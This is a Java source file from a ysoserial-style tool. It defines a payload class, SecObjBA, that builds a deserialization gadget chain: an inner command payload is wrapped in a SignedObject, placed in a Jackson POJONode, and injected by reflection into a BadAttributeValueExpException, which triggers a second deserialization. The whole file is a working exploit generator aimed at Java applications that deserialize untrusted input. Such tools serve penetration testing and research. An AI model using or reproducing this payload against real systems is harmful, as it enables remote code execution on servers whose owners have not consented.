package ysoserial.payloads;

import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.syndication.feed.impl.ObjectBean;
import org.apache.commons.codec.binary.Base64;
import ysoserial.Serializer;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.ParseArg;
import ysoserial.payloads.util.PayloadRunner;

import javax.management.BadAttributeValueExpException;
import javax.management.remote.JMXServiceURL;
import javax.management.remote.rmi.RMIConnector;
import java.io.Serializable;
import java.lang.reflect.Method;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.Signature;
import java.security.SignedObject;
import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

@SuppressWarnings({"rawtypes", "unchecked", "restriction"})
@Dependencies("jackson:jackson")
@Authors({ Authors.J1an })
public class SecObjBA extends PayloadRunner implements ObjectPayload<Object> {

    public Object getObject(final String command) throws Exception {
        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
        kpg.initialize(1024);
        KeyPair kp = kpg.generateKeyPair();
        Class payloadClazz= ParseArg.getTargetPayload(command);
        if (payloadClazz == null) {
            throw new IllegalArgumentException("Invalid payload type '" + command.split(":")[0] + "'");
        }
        Method getPayloadObj= payloadClazz.getMethod("getObject", String.class);
        SignedObject signedObject = new SignedObject((Serializable) getPayloadObj.invoke(payloadClazz.newInstance(), command.split(":",2)[1]), kp.getPrivate(), Signature.getInstance("DSA"));
        POJONode node = new POJONode(signedObject);
        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        Field valfield = val.getClass().getDeclaredField("val");
        valfield.setAccessible(true);
        valfield.set(val, node);
        return val;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(SecObjBA.class, args);
    }
}
